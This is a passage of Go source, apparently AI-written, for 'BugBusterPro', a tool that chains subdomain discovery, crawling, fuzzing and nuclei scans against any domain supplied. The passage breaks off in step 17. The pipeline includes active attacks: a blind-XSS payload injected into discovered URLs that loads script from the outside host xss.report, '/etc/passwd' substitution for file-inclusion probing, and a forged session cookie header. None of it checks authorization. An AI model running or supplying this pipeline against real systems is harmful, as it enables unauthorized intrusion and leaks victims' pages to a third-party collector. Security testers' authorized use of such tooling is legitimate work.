package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// BugBusterPro v1.2.2
// Author: Gemini (Based on user requirements)
// Date: 2025-04-05
// Description: Automated reconnaissance and vulnerability scanning tool.
//              Combines various security tools into a sequential workflow.

// --- Color Constants ---
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorBlue   = "\033[34m"
	colorPurple = "\033[35m"
	colorCyan   = "\033[36m"
	colorWhite  = "\033[37m"
)

// --- Configuration Struct ---
type Config struct {
	Domain             string
	OutputDir          string
	WordlistPath       string // Path for feroxbuster wordlist
	NucleiTemplatesDir string // Path for Nuclei templates base directory
	InteractshServer   string // Custom Interactsh server URL (optional)
	Force              bool
	Threads            int // General thread/concurrency hint
	LogFile            *os.File
	Logger             *log.Logger
}

// --- StepInfo Struct ---
type StepInfo struct {
	Name         string
	Description  string
	Command      string
	OutputFile   string // File *expected* to be created by the command's redirection or -o flag
	RequiresPipe bool   // Flag to indicate if the command uses shell pipes/redirection
	Completed    bool
}

// --- Required Tools ---
// List of command-line tools the script depends on.
var requiredTools = []string{
	"go", "subfinder", "httpx", "katana", "waybackurls", "otxurls",
	"feroxbuster", "nuclei", "subzy", "qsreplace", "gf", "bxss",
	"sort", "grep", "cat", "sh", "echo",
	"python3", "pip3", "corsy", // Added corsy explicitly
}

func main() {
	// --- Command-Line Flags ---
	domain := flag.String("domain", "", "Target domain to scan (required)")
	outputDir := flag.String("output-dir", "output", "Directory to store scan results")

	// Wordlist Path Logic: Check common locations, prioritize snap path
	defaultWordlist := "common.txt" // Basic fallback
	snapWordlistPath := "/snap/seclists/current/Discovery/Web-Content/common.txt"
	usrShareSecListsWordlistPath := "/usr/share/seclists/Discovery/Web-Content/common.txt"
	usrShareDirbWordlistPath := "/usr/share/wordlists/dirb/common.txt"
	// Add more common paths here if needed
	if _, err := os.Stat(snapWordlistPath); err == nil {
		defaultWordlist = snapWordlistPath
	} else if _, err := os.Stat(usrShareSecListsWordlistPath); err == nil {
		defaultWordlist = usrShareSecListsWordlistPath
	} else if _, err := os.Stat(usrShareDirbWordlistPath); err == nil {
		defaultWordlist = usrShareDirbWordlistPath
	}
	wordlistPath := flag.String("wordlist", defaultWordlist, "Path to wordlist for directory brute-forcing")

	nucleiTemplatesDir := flag.String("nuclei-templates-dir", "/opt/nuclei-templates/", "Base directory for Nuclei templates")
	interactshServer := flag.String("interactsh-server", "", "Custom Interactsh server URL (e.g., https://your-server.com) - optional")
	force := flag.Bool("force", false, "Force rerun of all steps, even if output files exist")
	threads := flag.Int("threads", 100, "Default number of threads/concurrency for tools") // Set based on user's common usage
	flag.Parse()

	if *domain == "" {
		fmt.Println(colorRed + "Error: --domain is required." + colorReset)
		flag.Usage()
		os.Exit(1)
	}

	// --- Create Config ---
	config := Config{
		Domain:             *domain,
		OutputDir:          filepath.Clean(*outputDir),
		WordlistPath:       *wordlistPath,
		NucleiTemplatesDir: filepath.Clean(*nucleiTemplatesDir), // Clean path
		InteractshServer:   *interactshServer,
		Force:              *force,
		Threads:            *threads,
	}

	// --- Initialization (Logging, Banner, Path Checks) ---
	if err := initialize(&config); err != nil {
		// Use fmt here as logger might not be fully initialized on error
		fmt.Printf(colorRed+"Initialization failed: %v\n"+colorReset, err)
		os.Exit(1)
	}
	defer func() {
		if config.LogFile != nil {
			config.LogFile.Close()
		}
	}() // Ensure log file is closed on exit

	// --- Check & Install Tools ---
	if !checkAndInstallTools(&config) {
		config.Logger.Println(colorRed + "Required tools check failed. Please install missing tools manually and try again." + colorReset)
		os.Exit(1) // Exit if critical tools are missing
	}

	// --- Create Output Directories ---
	createDirectories(&config)

	// --- Define Workflow Steps ---
	steps := defineSteps(&config)

	// --- Run Workflow Steps ---
	runAllSteps(&config, steps)

	// --- Print Final Summary ---
	printSummary(&config, steps)

	config.Logger.Println(colorGreen + "\nBugBusterPro finished." + colorReset)
}

// initialize sets up logging, prints the banner, and performs initial checks.
func initialize(config *Config) error {
	// Ensure base output directory exists first
	if err := os.MkdirAll(config.OutputDir, 0755); err != nil {
		return fmt.Errorf("error creating base output directory %s: %v", config.OutputDir, err)
	}

	// Setup logging (to file and console)
	logsDir := filepath.Join(config.OutputDir, "logs")
	if err := os.MkdirAll(logsDir, 0755); err != nil {
		return fmt.Errorf("error creating logs directory %s: %v", logsDir, err)
	}
	logFileName := filepath.Join(logsDir, fmt.Sprintf("bugbusterpro_%s_%s.log", config.Domain, time.Now().Format("20060102_150405")))
	logFile, err := os.Create(logFileName)
	if err != nil {
		return fmt.Errorf("error creating log file %s: %v", logFileName, err)
	}
	multiWriter := io.MultiWriter(os.Stdout, logFile)
	logger := log.New(multiWriter, "", log.Ldate|log.Ltime|log.Lmicroseconds)
	config.LogFile = logFile
	config.Logger = logger

	// Print banner now that logger is ready
	printBanner(config)

	// Log configuration details
	config.Logger.Printf("Output directory: %s", config.OutputDir)
	config.Logger.Printf("Force rerun: %t", config.Force)
	config.Logger.Printf("Default Threads/Concurrency: %d (Note: High values might cause rate-limiting or bans)", config.Threads)
	config.Logger.Printf("Log file: %s", config.LogFile.Name())

	// Check wordlist existence
	if _, err := os.Stat(config.WordlistPath); os.IsNotExist(err) {
		config.Logger.Printf(colorYellow+"Warning: Specified wordlist '%s' not found. Directory brute-forcing (Step 12) might fail.", config.WordlistPath+colorReset)
		config.Logger.Printf(colorYellow+"Use the --wordlist flag to specify the correct path."+colorReset)
	} else {
		config.Logger.Printf("Using wordlist: %s", config.WordlistPath)
	}

	// Check Nuclei templates directory existence
	if _, err := os.Stat(config.NucleiTemplatesDir); os.IsNotExist(err) {
		config.Logger.Printf(colorYellow+"Warning: Specified Nuclei templates directory '%s' not found. Nuclei scans might fail.", config.NucleiTemplatesDir+colorReset)
		config.Logger.Printf(colorYellow+"Ensure templates are present or use the --nuclei-templates-dir flag. Run 'nuclei -update-templates -td %s' manually if needed.", config.NucleiTemplatesDir+colorReset)
	} else {
		config.Logger.Printf("Using Nuclei templates directory: %s", config.NucleiTemplatesDir)
		config.Logger.Printf(colorYellow+"Note: Ensure Nuclei templates are up-to-date by running: nuclei -update-templates -td %s"+colorReset, config.NucleiTemplatesDir)
	}

	// Log Interactsh server if provided
	if config.InteractshServer != "" {
		config.Logger.Printf("Using custom Interactsh server: %s", config.InteractshServer)
	}

	return nil
}

// printBanner displays the tool's ASCII art banner and version.
func printBanner(config *Config) {
	// Using Println directly to avoid log prefixes on the banner itself
	fmt.Println(colorCyan + `
██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗  ██████╗
██╔══██╗██║   ██║██╔════╝ ██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗
██████╔╝██║   ██║██║  ███╗██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║
██╔══██╗██║   ██║██║   ██║██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██║   ██║
██████╔╝╚██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║██║     ██║  ██║╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝
                                                                                         v1.2.2 (Review/Refine)
` + colorReset)
	config.Logger.Printf("Starting BugBusterPro for domain: %s", config.Domain)
	// Other config details logged after banner in initialize()
}

// checkAndInstallTools verifies required tools are present and attempts installation if missing.
func checkAndInstallTools(config *Config) bool {
	config.Logger.Println(colorYellow + "Checking required tools..." + colorReset)
	allToolsFound := true
	goInstalled := isToolInstalled("go")
	python3Installed := isToolInstalled("python3")
	pip3Installed := isToolInstalled("pip3")

	// Pre-check essential interpreters/package managers
	if !goInstalled {
		config.Logger.Printf(colorRed + "Tool 'go' not found. Please install Go (https://golang.org/doc/install)." + colorReset)
		allToolsFound = false // Critical failure
	}
	if !python3Installed {
		config.Logger.Printf(colorRed + "Tool 'python3' not found. Please install Python 3." + colorReset)
		allToolsFound = false // Critical for Corsy step
	}
	if !pip3Installed {
		config.Logger.Printf(colorYellow + "Tool 'pip3' not found. Cannot automatically install Python packages like 'corsy'. Please install pip3 (e.g., 'sudo apt install python3-pip')." + colorReset)
		// Not setting allToolsFound=false here, corsy might be manually installed
	}

	// Check each required tool
	for _, tool := range requiredTools {
		// Skip checks for interpreters already checked
		if tool == "go" || tool == "python3" || tool == "pip3" {
			continue
		}

		toolPresent := isToolInstalled(tool) // Uses special check for 'corsy'

		if !toolPresent {
			// Define tool categories for installation logic
			isGoTool := contains([]string{"subfinder", "httpx", "katana", "waybackurls", "otxurls", "nuclei", "subzy", "qsreplace", "gf", "bxss"}, tool)
			isInstallablePkg := contains([]string{"feroxbuster"}, tool) // Tools potentially installed via system package manager
			isPipInstallable := contains([]string{"corsy"}, tool)       // Tools potentially installed via pip

			if isGoTool {
				if goInstalled { // Only attempt if Go is present
					config.Logger.Printf(colorYellow+"Tool '%s' not found. Attempting installation via 'go install'..."+colorReset, tool)
					if !installTool(config, tool) {
						allToolsFound = false // Fail if go tool install fails
						config.Logger.Printf(colorRed+"Failed to install '%s'. Please install manually."+colorReset, tool)
					}
				} else {
					// Go is missing, already logged above, mark as failure
					allToolsFound = false
				}
			} else if isInstallablePkg {
				config.Logger.Printf(colorYellow+"Tool '%s' not found. Attempting installation via package manager or cargo..."+colorReset, tool)
				if !installTool(config, tool) {
					allToolsFound = false
					config.Logger.Printf(colorRed+"Failed to install '%s'. Please install manually."+colorReset, tool)
				}
			} else if isPipInstallable {
				if python3Installed && pip3Installed { // Only attempt if pip3 is present
					config.Logger.Printf(colorYellow+"Tool/Package '%s' not found. Attempting installation via 'pip3 install'..."+colorReset, tool)
					if !installTool(config, tool) {
						// Don't necessarily fail the whole run if corsy install fails, but warn
						config.Logger.Printf(colorYellow+"Failed to automatically install '%s' via pip3. Step requiring it might fail."+colorReset, tool)
					}
				} else {
					config.Logger.Printf(colorRed+"Cannot attempt pip3 install for '%s' because python3 or pip3 is missing."+colorReset, tool)
					// If corsy was essential, python3 check already set allToolsFound=false
				}
			} else { // Basic utils (cat, grep, sort, sh, echo)
				config.Logger.Printf(colorRed+"Required utility '%s' not found in PATH. Please install it using your system's package manager."+colorReset, tool)
				allToolsFound = false // These are generally essential
			}
		} else {
			config.Logger.Printf(colorGreen+"Tool '%s' found."+colorReset, tool)
		}
	} // End tool loop

	if !allToolsFound {
		config.Logger.Println(colorRed + "\nOne or more critical tools/utilities are missing or could not be installed." + colorReset)
	} else {
		config.Logger.Println(colorGreen + "\nRequired tools check completed." + colorReset)
	}
	return allToolsFound
}

// isToolInstalled checks if a command exists in PATH or via python3 -m for corsy.
func isToolInstalled(tool string) bool {
	_, err := exec.LookPath(tool)
	// Special check for corsy: Can be run as 'python3 -m corsy'
	if tool == "corsy" && err != nil {
		cmd := exec.Command("python3", "-m", "corsy", "--help")
		cmd.Stdout = io.Discard // Don't need output
		cmd.Stderr = io.Discard
		errCheck := cmd.Run() // Check if command runs without error
		return errCheck == nil
	}
	return err == nil // Standard check for other tools
}

// installTool attempts to install a missing tool using common methods.
func installTool(config *Config, tool string) bool {
	config.Logger.Printf("Attempting to install %s...", tool)
	var cmd *exec.Cmd
	installSuccess := false // Used for non-go/cargo install methods

	// Determine installation command based on tool type
	switch tool {
	// --- Go Tools ---
	case "subfinder": cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
	case "httpx": cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/httpx/cmd/httpx@latest")
	case "katana": cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/katana/cmd/katana@latest")
	case "waybackurls": cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/waybackurls@latest")
	case "otxurls": cmd = exec.Command("go", "install", "-v", "github.com/lc/otxurls@latest")
	case "nuclei": cmd = exec.Command("go", "install", "-v", "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
	case "subzy": cmd = exec.Command("go", "install", "-v", "github.com/LukaSikic/subzy@latest")
	case "qsreplace": cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/qsreplace@latest")
	case "gf":
		cmd = exec.Command("go", "install", "-v", "github.com/tomnomnom/gf@latest")
		// Defer gf pattern setup note until after install attempt
		defer func() {
			if isToolInstalled("gf") {
				config.Logger.Printf(colorYellow + "Note: 'gf' installed. Ensure gf patterns are setup (e.g., from https://github.com/tomnomnom/gf)." + colorReset)
			}
		}()
	case "bxss": cmd = exec.Command("go", "install", "-v", "github.com/ethicalhackingplayground/bxss@latest")

	// --- System Package Manager / Cargo Tools ---
	case "feroxbuster":
		// Try common package managers first
		pkgManagers := []struct{ name string; updateCmd []string; installCmd []string }{
			{"apt-get", []string{"sudo", "apt-get", "update"}, []string{"sudo", "apt-get", "install", "-y", "feroxbuster"}},
			{"yum", nil, []string{"sudo", "yum", "install", "-y", "feroxbuster"}},
			{"dnf", nil, []string{"sudo", "dnf", "install", "-y", "feroxbuster"}},
			{"pacman", []string{"sudo", "pacman", "-Sy"}, []string{"sudo", "pacman", "-S", "--noconfirm", "feroxbuster"}},
		}
		installedViaPkg := false
		for _, pm := range pkgManagers {
			if isToolInstalled(pm.name) { // Check if package manager exists
				config.Logger.Printf("Trying to install '%s' using %s...", tool, pm.name)
				if pm.updateCmd != nil {
					// Run update command, log output, ignore error for update step
					runInstallCommand(config, exec.Command(pm.updateCmd[0], pm.updateCmd[1:]...), tool+" ("+pm.name+" update)")
				}
				// Run install command
				installCmd := exec.Command(pm.installCmd[0], pm.installCmd[1:]...)
				if err := runInstallCommand(config, installCmd, tool+" ("+pm.name+" install)"); err == nil {
					installSuccess = true // Mark as success
					installedViaPkg = true
					break // Stop trying other package managers
				}
			}
		}
		// If not installed via package manager, try cargo
		if !installedViaPkg {
			if isToolInstalled("cargo") {
				config.Logger.Printf("Trying to install '%s' using cargo...", tool)
				cmd = exec.Command("cargo", "install", "feroxbuster") // Set cmd for later execution
			} else {
				config.Logger.Printf(colorRed+"Cannot install '%s' automatically: No supported package manager or cargo found."+colorReset, tool)
				return false // Definite failure for this tool
			}
		}
		// If installed via pkg manager, cmd remains nil, installSuccess is true

	// --- Pip Installable Tools ---
	case "corsy":
		// Try system-wide pip install, then user install
		cmdPipSystem := exec.Command("pip3", "install", "corsy")
		if err := runInstallCommand(config, cmdPipSystem, tool+" (pip3 system)"); err != nil {
			config.Logger.Printf(colorYellow+"System pip3 install for '%s' failed (maybe permissions?), trying user install..."+colorReset, tool)
			cmdPipUser := exec.Command("pip3", "install", "--user", "corsy")
			if errUser := runInstallCommand(config, cmdPipUser, tool+" (pip3 user)"); errUser != nil {
				config.Logger.Printf(colorRed+"User pip3 install for '%s' also failed."+colorReset, tool)
				// Don't return false here, let the post-check handle verification failure softly
			} else {
				installSuccess = true // User install worked
				// Remind user about PATH for user installs
				homeDir, _ := os.UserHomeDir()
				if homeDir != "" {
					config.Logger.Printf(colorYellow+"Note: '%s' installed via pip3 --user. Ensure '%s/.local/bin' is in your PATH for direct execution (or use 'python3 -m corsy')."+colorReset, tool, homeDir)
				}
			}
		} else {
			installSuccess = true // System install worked
		}
		cmd = nil // Mark cmd as nil, pip handled the install attempt

	default:
		config.Logger.Printf(colorRed+"Unknown tool specified for installation: '%s'"+colorReset, tool)
		return false // Cannot install unknown tool
	}

	// --- Execute Go/Cargo Command (if cmd was set) ---
	if cmd != nil {
		// Set environment variables that might be needed for Go tools
		homeDir, err := os.UserHomeDir()
		if err == nil {
			cmd.Env = append(os.Environ(), "HOME="+homeDir)
			// Attempt to find Go path and add bin to PATH for the command context
			goPath := os.Getenv("GOPATH")
			if goPath == "" { goPath = filepath.Join(homeDir, "go") } // Common default
			goBin := filepath.Join(goPath, "bin")
			cmd.Env = append(cmd.Env, "PATH="+os.Getenv("PATH")+":"+goBin)
		}

		// Run the command (go install or cargo install)
		if err := runInstallCommand(config, cmd, tool); err != nil {
			return false // Go/Cargo command execution failed
		}
		installSuccess = true // Mark success if command ran without error
	}

	// --- Post-Installation Verification & Actions ---
	time.Sleep(1 * time.Second) // Brief pause for filesystem/PATH updates
	toolIsNowInstalled := isToolInstalled(tool) // Use the potentially special check

	if toolIsNowInstalled {
		if !installSuccess && cmd == nil && tool != "corsy" {
			// If tool exists now, but wasn't installed by pkg manager (installSuccess=false)
			// and wasn't a go/cargo install (cmd=nil), it must have already existed.
			// This path shouldn't be hit due to initial check, but acts as safeguard.
			config.Logger.Printf(colorGreen+"Tool '%s' confirmed present."+colorReset, tool)
		} else {
			config.Logger.Printf(colorGreen+"Successfully installed/verified '%s'"+colorReset, tool)
		}

		// Special action for Nuclei: Update templates in the specified directory
		if tool == "nuclei" {
			config.Logger.Printf(colorYellow+"Running 'nuclei -update-templates -td %s'..." + colorReset, config.NucleiTemplatesDir)
			_ = os.MkdirAll(config.NucleiTemplatesDir, 0755) // Ensure dir exists
			updateCmd := exec.Command("nuclei", "-update-templates", "-td", config.NucleiTemplatesDir)
			runInstallCommand(config, updateCmd, "nuclei-templates update") // Log output, don't fail script if update fails
		}
		return true // Tool is available
	} else {
		// If tool installation was attempted but it's still not found
		if tool == "corsy" {
			// Be lenient with corsy check failure post-install attempt
			config.Logger.Printf(colorYellow+"Could not verify '%s' installation after attempt. Step requiring it might fail."+colorReset, tool)
			return true // Allow script to continue, user might fix manually
		} else {
			config.Logger.Printf(colorRed+"Installation of '%s' seems to have failed (command check failed after install attempt). Please check logs."+colorReset, tool)
			return false // Installation failed
		}
	}
}

// runInstallCommand executes helper commands during installation and logs output.
func runInstallCommand(config *Config, cmd *exec.Cmd, logPrefix string) error {
	var outb, errb bytes.Buffer
	cmd.Stdout = &outb
	cmd.Stderr = &errb
	config.Logger.Printf("Running command for '%s': %s", logPrefix, cmd.String())
	err := cmd.Run()
	// Log stdout/stderr regardless of error
	stdoutStr := strings.TrimSpace(outb.String())
	stderrStr := strings.TrimSpace(errb.String())
	if stdoutStr != "" {
		scanner := bufio.NewScanner(strings.NewReader(stdoutStr))
		for scanner.Scan() { config.Logger.Printf("[%s stdout] %s", logPrefix, scanner.Text()) }
	}
	if stderrStr != "" {
		scanner := bufio.NewScanner(strings.NewReader(stderrStr))
		for scanner.Scan() { config.Logger.Printf(colorYellow+"[%s stderr] %s"+colorReset, logPrefix, scanner.Text()) }
	}
	// Report final status
	if err != nil {
		config.Logger.Printf(colorRed+"Command for '%s' failed: %v"+colorReset, logPrefix, err)
		return err // Return the error
	}
	// config.Logger.Printf("Command for '%s' completed successfully.", logPrefix) // Can be noisy
	return nil // Success
}

// createDirectories ensures all necessary subdirectories exist within the output folder.
func createDirectories(config *Config) {
	// List of subdirectories to create relative to config.OutputDir
	dirs := []string{
		"subfinder", "httpx", "urls", "js", "findings", "feroxbuster", // logs dir created in initialize
	}
	config.Logger.Println(colorBlue + "Creating output subdirectories..." + colorReset)
	for _, dir := range dirs {
		dirPath := filepath.Join(config.OutputDir, dir)
		if err := os.MkdirAll(dirPath, 0755); err != nil {
			// Log error but continue script execution
			config.Logger.Printf(colorRed+"Error creating directory %s: %v"+colorReset, dirPath, err)
		}
	}
	config.Logger.Printf("Output subdirectories checked/created in: %s", config.OutputDir)
}

// defineSteps configures the sequence of commands for the security workflow.
func defineSteps(config *Config) []StepInfo {
	// Define standard file paths relative to output directory
	subfinderOutput := filepath.Join(config.OutputDir, "subfinder", "subdomains.txt")
	httpxOutput := filepath.Join(config.OutputDir, "httpx", "alive_urls.txt")
	httpxHostsOutput := filepath.Join(config.OutputDir, "httpx", "alive_hosts.txt")
	corsyOutput := filepath.Join(config.OutputDir, "findings", "corsy.txt")
	urlsDir := filepath.Join(config.OutputDir, "urls")
	katanaOutput := filepath.Join(urlsDir, "katana_crawl.txt")
	waybackOutput := filepath.Join(urlsDir, "wayback.txt")
	otxOutput := filepath.Join(urlsDir, "otx.txt")
	allUrlsUnsorted := filepath.Join(urlsDir, "all_urls_unsorted.txt")
	allUrlsSorted := filepath.Join(urlsDir, "all_urls_sorted_unique.txt") // Main consolidated URL list
	secretsOutput := filepath.Join(config.OutputDir, "findings", "potential_secrets.txt")
	jsDir := filepath.Join(config.OutputDir, "js")
	jsFileUrlsFromGrep := filepath.Join(jsDir, "js_files_grep.txt")
	jsFindingsOutput := filepath.Join(config.OutputDir, "findings", "js_nuclei_findings.txt")
	jsKatanaPipelineOutput := filepath.Join(jsDir, "js_files_katana_pipeline.txt")
	jsKatanaPipelineFindingsOutput := filepath.Join(config.OutputDir, "findings", "js_katana_pipeline_nuclei.txt")
	feroxbusterDirOutput := filepath.Join(config.OutputDir, "feroxbuster")
	feroxbusterFileOutput := filepath.Join(feroxbusterDirOutput, fmt.Sprintf("feroxbuster_%s.txt", strings.ReplaceAll(config.Domain, ".", "_")))
	xssOutput := filepath.Join(config.OutputDir, "findings", "xss_bxss.txt")
	takeoverOutput := filepath.Join(config.OutputDir, "findings", "takeovers_subzy.txt")
	misconfigsOutput := filepath.Join(config.OutputDir, "findings", "misconfigs_nuclei.json")
	nucleiFindingsOutput := filepath.Join(config.OutputDir, "findings", "nuclei_findings.json")
	lfiOutput := filepath.Join(config.OutputDir, "findings", "lfi_nuclei.json")

	// Prepare optional Nuclei Interactsh flag
	interactshFlag := ""
	if config.InteractshServer != "" {
		// Ensure URL format is correct if needed, Nuclei usually handles it
		interactshFlag = fmt.Sprintf("-iserver %s", config.InteractshServer)
	}

	// Define the workflow steps
	// Note: OutputFile should match the file actually created by the command's -o flag or redirection (>).
	steps := []StepInfo{
		// --- Discovery ---
		{ // Step 1
			Name:        "1. Subdomain Discovery (subfinder)",
			Description: "Discovering subdomains using subfinder (passive + recursive)",
			Command:     fmt.Sprintf("subfinder -d %s -o %s -all -recursive -silent", config.Domain, subfinderOutput),
			OutputFile:  subfinderOutput,
		},
		{ // Step 2
			Name:        "2. Subdomain Probing (httpx)",
			Description: "Probing discovered subdomains for live HTTP/S servers",
			// Outputs full URLs and host:port list
			Command: fmt.Sprintf("cat %s | httpx -ports 80,443,8080,8443,8000,8888 -threads %d -timeout 10 -silent -o %s -output-host-port %s",
				subfinderOutput, config.Threads, httpxOutput, httpxHostsOutput),
			OutputFile:   httpxOutput, // Check the URL list file for completion
			RequiresPipe: true,
		},
		{ // Step 3 - Corsy Scan
			Name:        "3. CORS Scan (Corsy)",
			Description: "Checking alive URLs for CORS issues using Corsy",
			// Uses python3 -m to run, assumes corsy is installed
			// Redirects stdout to output file
			Command: fmt.Sprintf("python3 -m corsy -i %s -t %d --headers \"User-Agent: GoogleBot\\nCookie: SESSION=Hacked\" > %s",
				httpxOutput, config.Threads/2, corsyOutput), // Use fewer threads maybe
			OutputFile:   corsyOutput,
			RequiresPipe: true, // Uses redirection >
		},

		// --- URL Gathering ---
		{ // Step 4
			Name:        "4. URL Crawling (Katana)",
			Description: "Crawling live sites found by httpx using Katana",
			// -list takes file of URLs, -d depth, -jc JS parse, -kf known files, -ef exclude extensions
			Command: fmt.Sprintf("katana -list %s -d 5 -jc -kf -c %d -silent -ef woff,css,png,jpg,svg,ico,gif,jpeg,ttf,otf,eot -o %s",
				httpxOutput, config.Threads, katanaOutput),
			OutputFile: katanaOutput,
		},
		{ // Step 5
			Name:        "5. URL Archive Search (Waybackurls)",
			Description: "Fetching URLs from Wayback Machine for the root domain",
			Command:      fmt.Sprintf("echo %s | waybackurls > %s", config.Domain, waybackOutput),
			OutputFile:   waybackOutput,
			RequiresPipe: true,
		},
		{ // Step 6
			Name:        "6. URL Archive Search (OTX)",
			Description: "Fetching URLs from AlienVault OTX for the root domain and subdomains",
			Command:      fmt.Sprintf("echo %s | otxurls -s > %s", config.Domain, otxOutput), // -s includes subdomains
			OutputFile:   otxOutput,
			RequiresPipe: true,
		},
		{ // Step 7
			Name:        "7. Consolidate & Sort URLs",
			Description: "Combining URLs from Katana, Wayback, OTX; sorting uniquely",
			// Concatenate files, then sort unique into final file
			Command: fmt.Sprintf("cat %s %s %s > %s && cat %s | sort -u > %s",
				katanaOutput, waybackOutput, otxOutput, allUrlsUnsorted, allUrlsUnsorted, allUrlsSorted),
			OutputFile:   allUrlsSorted, // Check the final sorted file
			RequiresPipe: true,
		},

		// --- Initial Content Analysis ---
		{ // Step 8
			Name:        "8. Secret Files Discovery (grep)",
			Description: "Searching consolidated URLs for potentially sensitive file extensions",
			// Grep the sorted unique URL list
			Command: fmt.Sprintf("cat %s | grep -iE '\\.(log|txt|config|conf|cfg|ini|yml|yaml|json|sql|db|backup|bak|bkp|old|cache|secret|key|pem|csv|xls|xlsx|gz|tgz|zip|rar|7z)$' > %s",
				allUrlsSorted, secretsOutput), // Added -i for case-insensitive
			OutputFile:   secretsOutput,
			RequiresPipe: true,
		},
		{ // Step 9
			Name:        "9. JavaScript Files Collection (grep)",
			Description: "Extracting JavaScript file URLs from the consolidated list",
			Command: fmt.Sprintf("cat %s | grep -iE '\\.js$' > %s", // Added -i
				allUrlsSorted, jsFileUrlsFromGrep),
			OutputFile:   jsFileUrlsFromGrep,
			RequiresPipe: true,
		},
		{ // Step 10
			Name:        "10. JavaScript Analysis (Nuclei - Grepped Files)",
			Description: "Analyzing grep'd JavaScript files for exposures/secrets using Nuclei",
			// Uses the list of JS files from previous step
			Command: fmt.Sprintf("nuclei -l %s -td %s -t exposures/,javascript/ -tags js,secret -severity medium,high,critical -c %d -stats -o %s",
				jsFileUrlsFromGrep, config.NucleiTemplatesDir, config.Threads, jsFindingsOutput),
			OutputFile: jsFindingsOutput,
		},
		{ // Step 11 - Katana JS Pipeline Scan
			Name:        "11. JavaScript Analysis (Nuclei - Katana Pipeline)",
			Description: "Using Katana (-ps) to find JS files and analyze with Nuclei",
			// Pipe domain to katana, grep JS, save list, run nuclei
			Command: fmt.Sprintf("echo %s | katana -ps -silent -ef woff,css,png,jpg,svg,ico,gif,jpeg,ttf,otf,eot | grep -iE '\\.js$' > %s && nuclei -l %s -td %s -t exposures/,javascript/ -tags js,secret -severity medium,high,critical -c %d -stats -o %s",
				config.Domain, jsKatanaPipelineOutput, jsKatanaPipelineOutput, config.NucleiTemplatesDir, config.Threads, jsKatanaPipelineFindingsOutput),
			OutputFile:   jsKatanaPipelineFindingsOutput, // Check the final nuclei output
			RequiresPipe: true,
		},

		// --- Active Scanning/Testing ---
		{ // Step 12
			Name:        "12. Directory Bruteforce (feroxbuster)",
			Description: "Bruteforcing directories/files on live web servers using Feroxbuster",
			// Uses host:port list, configured wordlist, no-recursion, updated extensions
			Command: fmt.Sprintf("feroxbuster --stdin --wordlist %s --threads %d --depth 3 --no-recursion -x php,config,log,sql,bak,old,conf,backup,sub,db,asp,aspx,py,rb,cache,cgi,csv,htm,inc,jar,js,json,jsp,lock,rar,swp,txt,wadl,xml,tar.gz,tar.bz2 --status-codes 200,301,302,401 --filter-status 404,403,500 --silent --output %s < %s",
				config.WordlistPath, config.Threads, feroxbusterFileOutput, httpxHostsOutput),
			OutputFile:   feroxbusterFileOutput, // Check feroxbuster's output file
			RequiresPipe: true,                  // Uses < redirection
		},
		{ // Step 13
			Name:        "13. XSS Scan (gf + bxss)",
			Description: "Scanning found URLs for potential XSS using gf patterns and bxss",
			// Uses sorted URL list, gf xss pattern, bxss with xss.report payload
			Command: fmt.Sprintf("cat %s | gf xss | bxss -append -payload '<script/src=//xss.report/c/coffinpx></script>' -threads %d > %s",
				allUrlsSorted, config.Threads, xssOutput),
			OutputFile:   xssOutput,
			RequiresPipe: true,
		},
		{ // Step 14
			Name:        "14. Subdomain Takeover Check (subzy)",
			Description: "Checking discovered subdomains for potential takeover vulnerabilities",
			// Uses subfinder output list, correct --output flag
			Command: fmt.Sprintf("subzy run --targets %s --concurrency %d --hide_fails --verify_ssl --output %s",
				subfinderOutput, config.Threads*2, takeoverOutput), // Allow higher concurrency for subzy maybe
			OutputFile: takeoverOutput,
		},
		{ // Step 15 - Nuclei Misconfig Scan
			Name:        "15. Misconfiguration Scan (Nuclei)",
			Description: "Scanning live hosts for CORS and common misconfigurations using Nuclei",
			// Uses specific tags, validate flag, optional interactsh, JSON output
			Command: fmt.Sprintf("nuclei -l %s -td %s -tags cors,misconfig -severity medium,high,critical -rate-limit 150 -c %d -timeout 15 -stats -irr -validate %s -j -o %s",
				httpxOutput, config.NucleiTemplatesDir, config.Threads, interactshFlag, misconfigsOutput),
			OutputFile: misconfigsOutput,
		},
		{ // Step 16 - Nuclei CVE/Tech Scan
			Name:        "16. CVEs & Tech Scan (Nuclei)",
			Description: "Scanning for known CVEs, technology detection, and OSINT using Nuclei",
			// Uses relevant tags, JSON output
			Command: fmt.Sprintf("nuclei -l %s -td %s -tags cve,tech,osint -severity medium,high,critical,info -etags ssl -c %d -stats -j -o %s",
				httpxOutput, config.NucleiTemplatesDir, config.Threads, nucleiFindingsOutput),
			OutputFile: nucleiFindingsOutput,
		},
		{ // Step 17 - Nuclei LFI Scan
			Name:        "17. LFI Scan (gf + qsreplace + Nuclei)",
			Description: "Testing filtered URLs for potential Local File Inclusion using Nuclei",
			// Filters URLs with gf lfi, replaces params, uses LFI templates, optional interactsh
			Command: fmt.Sprintf("cat %s | gf lfi | qsreplace '/etc/passwd' | nuclei -td %s -tags lfi,file-inclusion -severity medium,high,critical -c %d -stats -irr %s -j -o %s",
				allUrlsSorted, config.NucleiTemplatesDir, config.Threads, interactshFlag, lfiOutput),
